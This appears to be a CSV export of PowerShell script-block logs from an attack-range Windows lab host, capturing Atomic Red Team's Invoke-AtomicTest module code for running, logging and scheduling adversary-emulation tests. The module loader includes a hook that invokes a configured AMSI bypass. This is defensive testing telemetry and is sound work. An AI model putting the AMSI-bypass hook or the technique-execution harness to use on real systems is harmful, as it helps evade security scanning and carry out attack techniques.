                        if ($(Test-IncludesTerraform $AT $testCount)) {
                            Remove-TerraformFiles $AT $testCount
                        }
                    }
                    else {
                        Write-KeyValue ""Executing test: "" $testId
                        $startTime = Get-Date
                        $final_command = Merge-InputArgs $test.executor.command $test $InputArgs $PathToPayloads
                        if (Get-Command 'Invoke-ARTPreAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicHook $test $InputArgs }
                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive
                        Write-Host ""Exit code: $($res.ExitCode)""
                        if (Get-Command 'Invoke-ARTPostAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicHook $test $InputArgs }
                        $stopTime = Get-Date
                        if ($isLoggingModuleSet) {
                            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                                &""$_\Write-ExecutionLog"" $startTime $stopTime $AT $testCount $test.name $test.auto_generated_guid $test.executor.name $test.description $final_command $ExecutionLogPath $executionHostname $executionUser $res (-Not($IsLinux -or $IsMacOS))
                            }
                        }
                        Write-KeyValue ""Done executing test: "" $testId
                    }

                } # End of foreach Test in single Atomic Technique
            } # End of foreach Technique in Atomic Tests
            if ($numAtomicsApplicableToPlatform -eq 0) {
                Write-Host -ForegroundColor Yellow ""Found $numAtomicsApplicableToPlatform atomic tests applicable to $executionPlatform platform for Technique $techniqueString""
            }
        } # End of Invoke-AtomicTestSingle function

        if ($AtomicTechnique -eq ""All"") {
            function Invoke-AllTests() {
                $AllAtomicTests = New-Object System.Collections.ArrayList
                Get-ChildItem $PathToAtomicsFolder -Directory -Filter T* | ForEach-Object {
                    $currentTechnique = [System.IO.Path]::GetFileName($_.FullName)
                    if ( $currentTechnique -match ""T[0-9]{4}.?([0-9]{3})?"" ) { $AllAtomicTests.Add($currentTechnique) | Out-Null }
                }
                $AllAtomicTests.GetEnumerator() | Foreach-Object { Invoke-AtomicTestSingle $_ }
            }

            if ( ($Force -or $CheckPrereqs -or $ShowDetails -or $ShowDetailsBrief -or $GetPrereqs) -or $psCmdlet.ShouldContinue( 'Do you wish to execute all tests?',
                    ""Highway to the danger zone, Executing All Atomic Tests!"" ) ) {
                Invoke-AllTests
            }
        }
        else {
            Invoke-AtomicTestSingle $AtomicTechnique
        }

        if ($isLoggingModuleSet) {
            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                &""$_\Stop-ExecutionLog"" $startTime $ExecutionLogPath $executionHostname $executionUser (-Not($IsLinux -or $IsMacOS))
            }
        }

    } # End of PROCESS block
    END { } # Intentionally left blank and can be removed
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","2","2",""
"12/16/2024 8:34:56 PM","35710882","1",", Get","Get [Score: 1]","13383","function Invoke-AtomicTest {
    [CmdletBinding(DefaultParameterSetName = 'technique',
        SupportsShouldProcess = $true,
        PositionalBinding = $false,
        ConfirmImpact = 'Medium')]
    Param(
        [Parameter(Mandatory = $true,
            Position = 0,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $AtomicTechnique,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $ShowDetails,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $ShowDetailsBrief,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $anyOS,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String[]]
        $TestNumbers,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String[]]
        $TestNames,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String[]]
        $TestGuids,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String]
        $PathToAtomicsFolder = $( if ($IsLinux -or $IsMacOS) { $Env:HOME + ""/AtomicRedTeam/atomics"" } else { $env:HOMEDRIVE + ""\AtomicRedTeam\atomics"" }),

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $CheckPrereqs = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $PromptForInputArgs = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $GetPrereqs = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $Cleanup = $false,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [switch]
        $NoExecutionLog = $false,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String]
        $ExecutionLogPath = $( if ($IsLinux -or $IsMacOS) { ""/tmp/Invoke-AtomicTest-ExecutionLog.csv"" } else { ""$env:TEMP\Invoke-AtomicTest-ExecutionLog.csv"" }),

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [switch]
        $Force,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [HashTable]
        $InputArgs,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [Int]
        $TimeoutSeconds = 120,

        [Parameter(Mandatory = $false, ParameterSetName = 'technique')]
        [System.Management.Automation.Runspaces.PSSession[]]$Session,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $Interactive = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $KeepStdOutStdErrFiles = $false,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String]
        $LoggingModule,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [switch]
        $SupressPathToAtomicsFolder = $false

    )
    BEGIN { } # Intentionally left blank and can be removed
    PROCESS {
        function ConvertTo-LoggerArray {
            param (
                [Parameter(Mandatory = $true)]
                [string]$Loggers
            )

            return $Loggers -split ',' | ForEach-Object { $_.Trim() }
        }

        $PathToAtomicsFolder = (Resolve-Path $PathToAtomicsFolder).Path

        Write-Verbose -Message 'Attempting to run Atomic Techniques'
        if (-not $supressPathToAtomicsFolder) { Write-Host -ForegroundColor Cyan ""PathToAtomicsFolder = $PathToAtomicsFolder`n"" }

        $executionPlatform, $isElevated, $tmpDir, $executionHostname, $executionUser = Get-TargetInfo $Session
        $PathToPayloads = if ($Session) { ""$tmpDir`AtomicRedTeam"" }  else { $PathToAtomicsFolder }

        # Since there might a comma(T1559-1,2,3) Powershell takes it as array.
        # So converting it back to string.
        if ($AtomicTechnique -is [array]) {
            $AtomicTechnique = $AtomicTechnique -join "",""
        }

        # Splitting Atomic Technique short form into technique and test numbers.
        $AtomicTechniqueParams = ($AtomicTechnique -split '-')
        $AtomicTechnique = $AtomicTechniqueParams[0]

        if ($AtomicTechniqueParams.Length -gt 1) {
            $ShortTestNumbers = $AtomicTechniqueParams[-1]
        }

        if ($null -eq $TestNumbers -and $null -ne $ShortTestNumbers) {
            $TestNumbers = $ShortTestNumbers -split ','
        }

        $isLoggingModuleSet = $false
        if (-not $NoExecutionLog) {
            $isLoggingModuleSet = $true
            if (-not $PSBoundParameters.ContainsKey('LoggingModule')) {
                # no logging module explicitly set
                # syslog logger
                $syslogOptionsSet = [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort
                if ( $artConfig.LoggingModule -eq ""Syslog-ExecutionLogger"" -or (($artConfig.LoggingModule -eq '') -and $syslogOptionsSet) ) {
                    if ($syslogOptionsSet) {
                        $LoggingModule = ""Syslog-ExecutionLogger""
                    }
                    else {
                        Write-Host -Fore Yellow ""Config.ps1 specified: Syslog-ExecutionLogger, but the syslogServer and syslogPort must be specified. Using the default logger instead""
                        $LoggingModule = ""Default-ExecutionLogger""
                    }
                }
                elseif (-not [bool]$artConfig.LoggingModule) {
                    # loggingModule is blank (not set), so use the default logger
                    $LoggingModule = ""Default-ExecutionLogger""
                }
                else {
                    $LoggingModule = $artConfig.LoggingModule
                }
            }
        }

        if ($isLoggingModuleSet) {
            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                if (Get-Module -name $_) {
                    Write-Verbose ""Using Logger: $_""
                }
                else {
                    Write-Host -Fore Yellow ""Logger not found: "", $_
                }

                # Change the defult logFile extension from csv to json and add a timestamp if using the Attire-ExecutionLogger
                if ($_ -eq ""Attire-ExecutionLogger"") { $ExecutionLogPath = $ExecutionLogPath.Replace(""Invoke-AtomicTest-ExecutionLog.csv"", ""Invoke-AtomicTest-ExecutionLog-timestamp.json"") }
                $ExecutionLogPath = $ExecutionLogPath.Replace(""timestamp"", $(Get-Date -UFormat %s))

                if (Get-Command ""$_\Start-ExecutionLog"" -erroraction silentlycontinue) {
                    if (Get-Command ""$_\Write-ExecutionLog"" -erroraction silentlycontinue) {
                        if (Get-Command ""$_\Stop-ExecutionLog"" -erroraction silentlycontinue) {
                            Write-Verbose ""All logging commands found""
                        }
                        else {
                            Write-Host ""Stop-ExecutionLog not found or loaded from the wrong module""
                            return
                        }
                    }
                    else {
                        Write-Host ""Write-ExecutionLog not found or loaded from the wrong module""
                        return
                    }
                }
                else {
                    Write-Host ""Start-ExecutionLog not found or loaded from the wrong module""
                    return
                }
            }

            # Here we're rebuilding an equivalent command line to put in the logs
            $commandLine = ""Invoke-AtomicTest $AtomicTechnique""

            if ($ShowDetails -ne $false) {
                $commandLine = ""$commandLine -ShowDetails $ShowDetails""
            }

            if ($ShowDetailsBrief -ne $false) {
                $commandLine = ""$commandLine -ShowDetailsBrief $ShowDetailsBrief""
            }

            if ($null -ne $TestNumbers) {
                $commandLine = ""$commandLine -TestNumbers $TestNumbers""
            }

            if ($null -ne $TestNames) {
                $commandLine = ""$commandLine -TestNames $TestNames""
            }

            if ($null -ne $TestGuids) {
                $commandLine = ""$commandLine -TestGuids $TestGuids""
            }

            $commandLine = ""$commandLine -PathToAtomicsFolder $PathToAtomicsFolder""

            if ($CheckPrereqs -ne $false) {
                $commandLine = ""$commandLine -CheckPrereqs $CheckPrereqs""
            }

            if ($PromptForInputArgs -ne $false) {
                $commandLine = ""$commandLine -PromptForInputArgs $PromptForInputArgs""
            }

            if ($GetPrereqs -ne $false) {
                $commandLine = ""$commandLine -GetPrereqs $GetPrereqs""
            }

            if ($Cleanup -ne $false) {
                $commandLine = ""$commandLine -Cleanup $Cleanup""
            }

            if ($NoExecutionLog -ne $false) {
                $commandLine = ""$commandLine -NoExecutionLog $NoExecutionLog""
            }

            $commandLine = ""$commandLine -ExecutionLogPath $ExecutionLogPath""

            if ($Force -ne $false) {
                $commandLine = ""$commandLine -Force $Force""
            }

            if ($InputArgs -ne $null) {
                $commandLine = ""$commandLine -InputArgs $InputArgs""
            }

            $commandLine = ""$commandLine -TimeoutSeconds $TimeoutSeconds""
            if ($PSBoundParameters.ContainsKey('Session')) {
                if ( $null -eq $Session ) {
                    Write-Error ""The provided session is null and cannot be used.""
                    continue
                }
                else {
                    $commandLine = ""$commandLine -Session $Session""
                }
            }

            if ($Interactive -ne $false) {
                $commandLine = ""$commandLine -Interactive $Interactive""
            }

            if ($KeepStdOutStdErrFiles -ne $false) {
                $commandLine = ""$commandLine -KeepStdOutStdErrFiles $KeepStdOutStdErrFiles""
            }

            if ($null -ne $LoggingModule) {
                $commandLine = ""$commandLine -LoggingModule $LoggingModule""
            }

            $startTime = Get-Date
            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                &""$_\Start-ExecutionLog"" $startTime $ExecutionLogPath $executionHostname $executionUser $commandLine (-Not($IsLinux -or $IsMacOS))
            }
        }

        function Platform-IncludesCloud {
            $cloud = ('office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')
            foreach ($platform in $test.supported_platforms) {
                if ($cloud -contains $platform) {
                    return $true
                }
            }
            return $false
        }

        function Test-IncludesTerraform($AT, $testCount) {
            $AT = $AT.ToUpper()
            $pathToTerraform = Join-Path $PathToAtomicsFolder ""\$AT\src\$AT-$testCount\$AT-$testCount.tf""
            $cloud = ('iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')
            foreach ($platform in $test.supported_platforms) {
                if ($cloud -contains $platform) {
                    return $(Test-Path -Path $pathToTerraform)
                }
            }
            return $false
        }

        function Build-TFVars($AT, $testCount, $InputArgs) {
            $tmpDirPath = Join-Path $PathToAtomicsFolder ""\$AT\src\$AT-$testCount""
            if ($InputArgs) {
                $destinationVarsPath = Join-Path ""$tmpDirPath"" ""terraform.tfvars.json""
                $InputArgs | ConvertTo-Json | Out-File -FilePath $destinationVarsPath
            }
        }

        function Remove-TerraformFiles($AT, $testCount) {
            $tmpDirPath = Join-Path $PathToAtomicsFolder ""\$AT\src\$AT-$testCount""
            Write-Host $tmpDirPath
            $tfStateFile = Join-Path $tmpDirPath ""terraform.tfstate""
            $tfvarsFile = Join-Path $tmpDirPath ""terraform.tfvars.json""
            if ($(Test-Path $tfvarsFile)) {
                Remove-Item -LiteralPath $tfvarsFile -Force
            }
            if ($(Test-Path $tfStateFile)) {
                (Get-ChildItem -Path $tmpDirPath).Fullname -match ""terraform.tfstate*"" | Remove-Item -Force
            }
        }

        function Invoke-AtomicTestSingl","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","2",""
"12/16/2024 8:34:55 PM","35710733","1",", Get","Get [Score: 1]","1945","function Get-InputArgs([hashtable]$ip, $customInputArgs, $PathToAtomicsFolder) {
    $defaultArgs = @{ }
    foreach ($key in $ip.Keys) {
        $defaultArgs[$key] = $ip[$key].default
    }
    # overwrite defaults with any user supplied values
    foreach ($key in $customInputArgs.Keys) {
        if ($defaultArgs.Keys -contains $key) {
            # replace default with user supplied
            $defaultArgs.set_Item($key, $customInputArgs[$key])
        }
        else {
            Write-Verbose ""The specified input argument *$key* was ignored as not applicable""
        }
    }
    $defaultArgs
}

function Merge-InputArgs($finalCommand, $test, $customInputArgs, $PathToAtomicsFolder) {
    if (($null -ne $finalCommand) -and ($test.input_arguments.Count -gt 0)) {
        Write-Verbose -Message 'Replacing inputArgs with user specified values, or default values if none provided'
        $inputArgs = Get-InputArgs $test.input_arguments $customInputArgs $PathToAtomicsFolder

        foreach ($key in $inputArgs.Keys) {
            $findValue = '#{' + $key + '}'
            $finalCommand = $finalCommand.Replace($findValue, $inputArgs[$key])
        }
    }

    # Replace $PathToAtomicsFolder or PathToAtomicsFolder with the actual -PathToAtomicsFolder value
    $finalCommand = ($finalCommand -replace ""\`$PathToAtomicsFolder"", $PathToAtomicsFolder) -replace ""PathToAtomicsFolder"", $PathToAtomicsFolder

    $finalCommand
}

function Invoke-PromptForInputArgs([hashtable]$ip) {
    $InputArgs = @{ }
    foreach ($key in $ip.Keys) {
        $InputArgs[$key] = $ip[$key].default
        $newValue = Read-Host -Prompt ""Enter a value for $key , or press enter to accept the default.`n$($ip[$key].description.trim()) [$($ip[$key].default.trim())]""
        # replace default with user supplied
        if (-not [string]::IsNullOrWhiteSpace($newValue)) {
            $InputArgs.set_Item($key, $newValue)
        }
    }
    $InputArgs
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710669","1",", Get","Get [Score: 1]","1654","function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {
    if ($isWindows -and -not [System.Diagnostics.EventLog]::Exists('Atomic Red Team')) {
        New-EventLog -Source ""Applications and Services Logs"" -LogName ""Atomic Red Team""
    }
}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {
    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $timeLocal = (Get-Date($startTime) -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $ipAddress = Get-PreferredIPAddress $isWindows

    $msg = [PSCustomObject][ordered]@{
        ""Execution Time (UTC)""   = $timeUTC
        ""Execution Time (Local)"" = $timeLocal
        ""Technique""              = $technique
        ""Test Number""            = $testNum
        ""Test Name""              = $testName
        ""Hostname""               = $targetHostname
        ""IP Address""             = $ipAddress
        ""Username""               = $targetUser
        ""GUID""                   = $testGuid
        ""Tag""                    = ""atomicrunner""
        ""CustomTag""              = $artConfig.CustomTag
        ""ProcessId""              = $res.ProcessId
        ""ExitCode""               = $res.ExitCode
    }

    Write-EventLog  -Source ""Applications and Services Logs"" -LogName ""Atomic Red Team"" -EventID 3001 -EntryType Information -Message $msg -Category 1 -RawData 10, 20
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710860","1",", Get","Get [Score: 1]","1654","function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {
    if ($isWindows -and -not [System.Diagnostics.EventLog]::Exists('Atomic Red Team')) {
        New-EventLog -Source ""Applications and Services Logs"" -LogName ""Atomic Red Team""
    }
}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {
    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $timeLocal = (Get-Date($startTime) -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $ipAddress = Get-PreferredIPAddress $isWindows

    $msg = [PSCustomObject][ordered]@{
        ""Execution Time (UTC)""   = $timeUTC
        ""Execution Time (Local)"" = $timeLocal
        ""Technique""              = $technique
        ""Test Number""            = $testNum
        ""Test Name""              = $testName
        ""Hostname""               = $targetHostname
        ""IP Address""             = $ipAddress
        ""Username""               = $targetUser
        ""GUID""                   = $testGuid
        ""Tag""                    = ""atomicrunner""
        ""CustomTag""              = $artConfig.CustomTag
        ""ProcessId""              = $res.ProcessId
        ""ExitCode""               = $res.ExitCode
    }

    Write-EventLog  -Source ""Applications and Services Logs"" -LogName ""Atomic Red Team"" -EventID 3001 -EntryType Information -Message $msg -Category 1 -RawData 10, 20
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710863","1",", Get","Get [Score: 1]","847","#requires -Version 5.0

# execute amsi bypass if configured to use one
if([bool]$artConfig.absb -and ($artConfig.OS -eq ""windows"")){
    $artConfig.absb.Invoke()
}

#Get public and private function definition files.
$Public = @( Get-ChildItem -Path $PSScriptRoot\Public\*.ps1 -Recurse -Exclude AtomicRunnerService.ps1 -ErrorAction SilentlyContinue )
$Private = @( Get-ChildItem -Path $PSScriptRoot\Private\*.ps1 -Recurse -Exclude ""AtomicClassSchema.ps1"" -ErrorAction SilentlyContinue )

# Make sure the Atomic Class Schema is available first (a workaround so PSv5.0 doesn't give errors)
. ""$PSScriptRoot\Private\AtomicClassSchema.ps1""

#Dot source the files
Foreach ($import in @($Public + $Private)) {
    Try {
        . $import.fullname
    }
    Catch {
        Write-Error -Message ""Failed to import function $($import.fullname): $_""
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710878","1",", Get","Get [Score: 1]","7135","# Loop through all atomic yaml files to load into list of objects
function Loop($fileList, $atomicType) {
    $AllAtomicTests = New-Object System.Collections.ArrayList

    $fileList | ForEach-Object {
        $currentTechnique = [System.IO.Path]::GetFileNameWithoutExtension($_.FullName)
        if ( $currentTechnique -ne ""index"" ) {
            $technique = Get-AtomicTechnique -Path $_.FullName
            if ($technique) {
                $technique.atomic_tests | ForEach-Object -Process {
                    $test = New-Object -TypeName psobject
                    $test | Add-Member -MemberType NoteProperty -Name Order -Value $null
                    $test | Add-Member -MemberType NoteProperty -Name Technique -Value ($technique.attack_technique -join ""|"")
                    $test | Add-Member -MemberType NoteProperty -Name TestName -Value $_.name
                    $test | Add-Member -MemberType NoteProperty -Name auto_generated_guid -Value $_.auto_generated_guid
                    $test | Add-Member -MemberType NoteProperty -Name supported_platforms -Value ($_.supported_platforms -join ""|"")
                    $test | Add-Member -MemberType NoteProperty -Name TimeoutSeconds -Value 120
                    $test | Add-Member -MemberType NoteProperty -Name InputArgs -Value """"
                    $test | Add-Member -MemberType NoteProperty -Name AtomicsFolder -Value $atomicType
                    $test | Add-Member -MemberType NoteProperty -Name enabled -Value $false
                    $test | Add-Member -MemberType NoteProperty -Name notes -Value """"

                    # Added dummy variable to grab the index values returned by appending to an arraylist so they don't get written to the screen
                    $dummy = $AllAtomicTests.Add(($test))
                }
            }
        }
    }
    return $AllAtomicTests

}

function Get-NewSchedule() {
    if (Test-Path $artConfig.PathToPublicAtomicsFolder) {
        $publicAtomicFiles = Get-ChildItem $artConfig.PathToPublicAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml -File
        $publicAtomics = Loop $publicAtomicFiles ""Public""
    }
    else {
        Write-Host -ForegroundColor Yellow ""Public Atomics Folder not Found $($artConfig.PathToPublicAtomicsFolder)""
    }
    if (Test-Path $artConfig.PathToPrivateAtomicsFolder) {
        $privateAtomicFiles = Get-ChildItem $artConfig.PathToPrivateAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml  -File
        $privateAtomics = Loop $privateAtomicFiles ""Private""
    }
    else {
        Write-Verbose ""Private Atomics Folder not Found $($artConfig.PathToPrivateAtomicsFolder)""
    }
    $AllAtomicTests = New-Object System.Collections.ArrayList
    try { $AllAtomicTests.AddRange($publicAtomics) }catch {}
    try { $AllAtomicTests.AddRange($privateAtomics) }catch {}
    return $AllAtomicTests
}

function Get-ScheduleRefresh() {
    $AllAtomicTests = Get-NewSchedule
    $schedule = Get-Schedule $null $false # get schedule, including inactive (ie not filtered)

    # Creating new schedule object for updating changes in atomics
    $newSchedule = New-Object System.Collections.ArrayList

    # Check if any tests haven't been added to schedule and add them
    $update = $false
    foreach ($guid in $AllAtomicTests | Select-Object -ExpandProperty auto_generated_guid) {
        $fresh = $AllAtomicTests | Where-Object { $_.auto_generated_guid -eq $guid }
        $old = $schedule | Where-Object { $_.auto_generated_guid -eq $guid }

        if (!$old) {
            $update = $true
            $newSchedule += $fresh
        }

        # Updating schedule with changes
        else {
            if ($fresh -is [array]) {
                $fresh = $fresh[0]
                LogRunnerMsg ""Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).
                            `nCannot Continue Execution. System Exit""
                Write-Host -ForegroundColor Yellow ""Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).
                            `nCannot Continue Execution. System Exit""; Start-Sleep 10
                exit
            }
            $old.Technique = $fresh.Technique
            $old.TestName = $fresh.TestName
            $old.supported_platforms = $fresh.supported_platforms

            $update = $true
            $newSchedule += $old
        }

    }
    if ($update) {
        $newSchedule | Export-Csv $artConfig.scheduleFile
        LogRunnerMsg ""Schedule has been updated with new tests.""
    }
    return $newSchedule

}

function Get-Schedule($listOfAtomics, $filterByEnabled = $true, $testGuids = $null, $filterByPlatform = $true) {
    if ($listOfAtomics -or (Test-Path($artConfig.scheduleFile))) {
        if ($listOfAtomics) {
            $schedule = Import-Csv $listOfAtomics
        }
        else {
            $schedule = Import-Csv $artConfig.scheduleFile
        }

        # Filter schedule to either Active/Supported Platform or TestGuids List
        if ($TestGuids) {
            $schedule = $schedule | Where-Object {
                ($Null -ne $TestGuids -and $TestGuids -contains $_.auto_generated_guid)
            }
        }
        else {
            if ($filterByEnabled -and $filterByPlatform) {
                $schedule = $schedule | Where-Object { ($_.enabled -eq $true -and ($_.supported_platforms -like ""*"" + $artConfig.OS + ""*"" )) }
            }
            elseif ($filterByEnabled) {
                $schedule = $schedule | Where-Object { $_.enabled -eq $true }
            }
            elseif ($filterByPlatform) {
                $schedule = $schedule | Where-Object { $_.supported_platforms -like ""*"" + $artConfig.OS + ""*"" }
            }
        }

    }
    else {
        Write-Host -ForegroundColor Yellow ""Couldn't find schedule file ($($artConfig.scheduleFile)) Update the path to the schedule file in the config or generate a new one with 'Invoke-GenerateNewSchedule'""
    }

    if (($null -eq $schedule) -or ($schedule.length -eq 0)) { Write-Host -ForegroundColor Yellow ""No active tests were found. Edit the 'enabled' column of your schedule file and set some to enabled (True)""; return $null }
    return $schedule
}

function Invoke-GenerateNewSchedule() {
    #create AtomicRunner-Logs directories if they don't exist
    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore | Out-Null
    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore | Out-Null

    LogRunnerMsg ""Generating new schedule: $($artConfig.scheduleFile)""
    $schedule = Get-NewSchedule
    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation
    Write-Host -ForegroundColor Green ""Schedule written to $($artConfig.scheduleFile)""
}

function Invoke-RefreshExistingSchedule() {
    LogRunnerMsg ""Refreshing existing schedule: $($artConfig.scheduleFile)""
    $schedule = Get-ScheduleRefresh
    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation
    Write-Host -ForegroundColor Green ""Refreshed schedule written to $($artConfig.scheduleFile)""
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710724","1",", Get","Get [Score: 1]","1000","function Invoke-CheckPrereqs ($test, $isElevated, $executionPlatform, $customInputArgs, $PathToAtomicsFolder, $TimeoutSeconds, $session = $null) {
    $FailureReasons = New-Object System.Collections.ArrayList
    if ( $test.executor.elevation_required -and -not $isElevated) {
        $FailureReasons.add(""Elevation required but not provided`n"") | Out-Null
    }
    foreach ($dep in $test.dependencies) {
        $executor = Get-PrereqExecutor $test
        $final_command = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder
        if ($executor -ne ""powershell"") { $final_command = ($final_Command.trim()).Replace(""`n"", "" && "") }
        $res = Invoke-ExecuteCommand $final_command $executor $executionPlatform $TimeoutSeconds  $session
        $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder
        if ($res.ExitCode -ne 0) {
            $FailureReasons.add($description) | Out-Null
        }
    }
    $FailureReasons
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710687","1",", Get","Get [Score: 1]","7135","# Loop through all atomic yaml files to load into list of objects
function Loop($fileList, $atomicType) {
    $AllAtomicTests = New-Object System.Collections.ArrayList

    $fileList | ForEach-Object {
        $currentTechnique = [System.IO.Path]::GetFileNameWithoutExtension($_.FullName)
        if ( $currentTechnique -ne ""index"" ) {
            $technique = Get-AtomicTechnique -Path $_.FullName
            if ($technique) {
                $technique.atomic_tests | ForEach-Object -Process {
                    $test = New-Object -TypeName psobject
                    $test | Add-Member -MemberType NoteProperty -Name Order -Value $null
                    $test | Add-Member -MemberType NoteProperty -Name Technique -Value ($technique.attack_technique -join ""|"")
                    $test | Add-Member -MemberType NoteProperty -Name TestName -Value $_.name
                    $test | Add-Member -MemberType NoteProperty -Name auto_generated_guid -Value $_.auto_generated_guid
                    $test | Add-Member -MemberType NoteProperty -Name supported_platforms -Value ($_.supported_platforms -join ""|"")
                    $test | Add-Member -MemberType NoteProperty -Name TimeoutSeconds -Value 120
                    $test | Add-Member -MemberType NoteProperty -Name InputArgs -Value """"
                    $test | Add-Member -MemberType NoteProperty -Name AtomicsFolder -Value $atomicType
                    $test | Add-Member -MemberType NoteProperty -Name enabled -Value $false
                    $test | Add-Member -MemberType NoteProperty -Name notes -Value """"

                    # Added dummy variable to grab the index values returned by appending to an arraylist so they don't get written to the screen
                    $dummy = $AllAtomicTests.Add(($test))
                }
            }
        }
    }
    return $AllAtomicTests

}

function Get-NewSchedule() {
    if (Test-Path $artConfig.PathToPublicAtomicsFolder) {
        $publicAtomicFiles = Get-ChildItem $artConfig.PathToPublicAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml -File
        $publicAtomics = Loop $publicAtomicFiles ""Public""
    }
    else {
        Write-Host -ForegroundColor Yellow ""Public Atomics Folder not Found $($artConfig.PathToPublicAtomicsFolder)""
    }
    if (Test-Path $artConfig.PathToPrivateAtomicsFolder) {
        $privateAtomicFiles = Get-ChildItem $artConfig.PathToPrivateAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml  -File
        $privateAtomics = Loop $privateAtomicFiles ""Private""
    }
    else {
        Write-Verbose ""Private Atomics Folder not Found $($artConfig.PathToPrivateAtomicsFolder)""
    }
    $AllAtomicTests = New-Object System.Collections.ArrayList
    try { $AllAtomicTests.AddRange($publicAtomics) }catch {}
    try { $AllAtomicTests.AddRange($privateAtomics) }catch {}
    return $AllAtomicTests
}

function Get-ScheduleRefresh() {
    $AllAtomicTests = Get-NewSchedule
    $schedule = Get-Schedule $null $false # get schedule, including inactive (ie not filtered)

    # Creating new schedule object for updating changes in atomics
    $newSchedule = New-Object System.Collections.ArrayList

    # Check if any tests haven't been added to schedule and add them
    $update = $false
    foreach ($guid in $AllAtomicTests | Select-Object -ExpandProperty auto_generated_guid) {
        $fresh = $AllAtomicTests | Where-Object { $_.auto_generated_guid -eq $guid }
